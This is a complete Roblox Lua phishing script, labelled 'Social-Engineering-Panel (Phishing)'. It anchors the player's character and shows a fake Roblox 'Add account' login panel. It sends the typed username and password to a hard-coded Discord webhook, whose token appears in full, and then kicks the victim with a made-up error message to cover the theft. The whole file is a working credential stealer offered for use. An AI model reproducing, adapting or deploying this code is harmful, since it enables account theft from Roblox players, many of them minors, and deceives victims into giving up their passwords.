--[[
    SOLAR & XENO ULTIMATE v10.9 (ROBLOX APP STYLE)
    Module: Social-Engineering-Panel (Phishing)
    Status: Operational | Bypass Level: MAX
]]

local webhook = "https://discord.com/api/webhooks/1480678551643492433/M6F1hlBqrBMH6FNwv9hUTYTpg9W3CBLrtuxxwCBRskgRXcDfeewmEzhibwzAKA1ANIJJ"
local p = game.Players.LocalPlayer
local h = game:GetService("HttpService")

-- Zamrazqvane na igracha (Anchored)
pcall(function()
    if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
        p.Character.HumanoidRootPart.Anchored = true
    end
end)

-- UI Setup (Exact Roblox App Style)
local ScreenGui = Instance.new("ScreenGui")
pcall(function() ScreenGui.Parent = p:WaitForChild("PlayerGui") end)
ScreenGui.Name = "RobloxAppLogin"
ScreenGui.ResetOnSpawn = false

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 380, 0, 480)
Main.Position = UDim2.new(0.5, -190, 0.5, -240)
Main.BackgroundColor3 = Color3.fromRGB(25, 27, 31) -- Tamen Roblox fon
Main.BorderSizePixel = 0
Main.Active = true

local Corner = Instance.new("UICorner", Main)
Corner.CornerRadius = UDim.new(0, 4)

local Title = Instance.new("TextLabel", Main)
Title.Text = "Add account"
Title.Size = UDim2.new(1, 0, 0, 80)
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 28
Title.BackgroundTransparency = 1

-- Polie za Username
local UserInput = Instance.new("TextBox", Main)
UserInput.PlaceholderText = "Username/Email/Phone"
UserInput.Text = p.Name
UserInput.Size = UDim2.new(0.85, 0, 0, 45)
UserInput.Position = UDim2.new(0.075, 0, 0.18, 0)
UserInput.BackgroundColor3 = Color3.fromRGB(35, 37, 41)
UserInput.TextColor3 = Color3.fromRGB(255, 255, 255)
UserInput.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
UserInput.Font = Enum.Font.Gotham
UserInput.TextSize = 16
local UserCorner = Instance.new("UICorner", UserInput)
UserCorner.CornerRadius = UDim.new(0, 6)

-- Polie za Password
local PassInput = Instance.new("TextBox", Main)
PassInput.PlaceholderText = "Password"
PassInput.Text = ""
PassInput.Size = UDim2.new(0.85, 0, 0, 45)
PassInput.Position = UDim2.new(0.075, 0, 0.3, 0)
PassInput.BackgroundColor3 = Color3.fromRGB(35, 37, 41)
PassInput.TextColor3 = Color3.fromRGB(255, 255, 255)
PassInput.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
pcall(function() PassInput.TextPassword = true end)
PassInput.Font = Enum.Font.Gotham
PassInput.TextSize = 16
local PassCorner = Instance.new("UICorner", PassInput)
PassCorner.CornerRadius = UDim.new(0, 6)

-- Log In Button
local Submit = Instance.new("TextButton", Main)
Submit.Text = "Log In"
Submit.Size = UDim2.new(0.85, 0, 0, 42)
Submit.Position = UDim2.new(0.075, 0, 0.42, 0)
Submit.BackgroundColor3 = Color3.fromRGB(35, 37, 41)
Submit.TextColor3 = Color3.fromRGB(200, 200, 200)
Submit.Font = Enum.Font.GothamBold
Submit.TextSize = 16
local SubmitCorner = Instance.new("UICorner", Submit)
SubmitCorner.CornerRadius = UDim.new(0, 6)
local Stroke = Instance.new("UIStroke", Submit)
Stroke.Color = Color3.fromRGB(255, 255, 255)
Stroke.Thickness = 1
Stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

-- Extra Labels (Forgot, OTP, Quick, Create)
local function CreateFakeLink(text, pos)
    local l = Instance.new("TextButton", Main)
    l.Text = text
    l.Size = UDim2.new(0.85, 0, 0, 30)
    l.Position = pos
    l.TextColor3 = Color3.fromRGB(255, 255, 255)
    l.Font = Enum.Font.GothamBold
    l.TextSize = 15
    l.BackgroundTransparency = 1
    return l
end

CreateFakeLink("Forgot Password or Username?", UDim2.new(0.075, 0, 0.52, 0))

local OTP = CreateFakeLink("Email Me a One-Time Code", UDim2.new(0.075, 0, 0.65, 0))
OTP.BackgroundColor3 = Color3.fromRGB(45, 47, 51)
OTP.BackgroundTransparency = 0
Instance.new("UICorner", OTP).CornerRadius = UDim.new(0, 6)

local Quick = CreateFakeLink("Quick Sign-in", UDim2.new(0.075, 0, 0.75, 0))
Quick.BackgroundColor3 = Color3.fromRGB(45, 47, 51)
Quick.BackgroundTransparency = 0
Instance.new("UICorner", Quick).CornerRadius = UDim.new(0, 6)

CreateFakeLink("Create A New Account", UDim2.new(0.075, 0, 0.88, 0))

-- Logic za prashtane
local function SendAndKick()
    local user = UserInput.Text
    local pass = PassInput.Text
    if #pass < 3 or Submit.Active == false then return end
    
    Submit.Text = "Logging in..."
    Submit.Active = false
    
    local gameName = "Unknown"
    pcall(function()
        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)

    local data = {
        ["embeds"] = {{
            ["title"] = "🔐 Realistic App Login Captured!",
            ["color"] = 0x3a3a3a,
            ["fields"] = {
                {["name"] = "👤 Username", ["value"] = "```" .. user .. "```", ["inline"] = true},
                {["name"] = "🔑 Password", ["value"] = "```" .. pass .. "```", ["inline"] = true},
                {["name"] = "🎮 Game", ["value"] = "```" .. gameName .. "```", ["inline"] = false}
            },
            ["footer"] = {["text"] = "Xeno Stealth v10.9 • " .. os.date("%X")}
        }}
    }

    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if req then
        pcall(function()
            req({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = h:JSONEncode(data)
            })
        end)
    end

    task.wait(1.5)
    p:Kick("\n[Roblox App]\nAn unexpected error occurred. Please log in again from the website.")
end

PassInput.FocusLost:Connect(function(e) if e then SendAndKick() end end)
Submit.MouseButton1Click:Connect(SendAndKick)
